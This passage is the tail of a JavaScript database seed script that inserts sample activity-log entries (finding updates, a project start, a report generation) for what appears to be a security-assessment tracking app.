      ...(f012 ? [{ userId: KO.id, projectId: p1.id, findingId: f012.id, action: 'updated', target: f012.title, detail: 'severity, status', badge: 'UPDATED', createdAt: ago(1500) }] : []),
      // AW starts p2 project
      { userId: AW.id, projectId: p2.id, action: 'created', target: 'Noriga Payments API', detail: 'Internal API + Mobile engagement started', badge: 'PROJECT', createdAt: ago(2880) },
      // SJ generates cloud report
      { userId: SJ.id, projectId: p3.id, action: 'generated', target: 'R-0038 Technical Report', detail: 'v2 — final', badge: 'REPORT', createdAt: ago(4320) },
      // TL adds remediation note
      ...(f012 ? [{ userId: TL.id, projectId: p1.id, findingId: f012.id, action: 'updated', target: f012.title, detail: 'remediation', badge: 'UPDATED', createdAt: ago(5040) }] : []),
    ];

    for (const a of activities) {
      await db.activity.create({ data: a as any });
    }
  }

  console.log('Seed complete.');
}
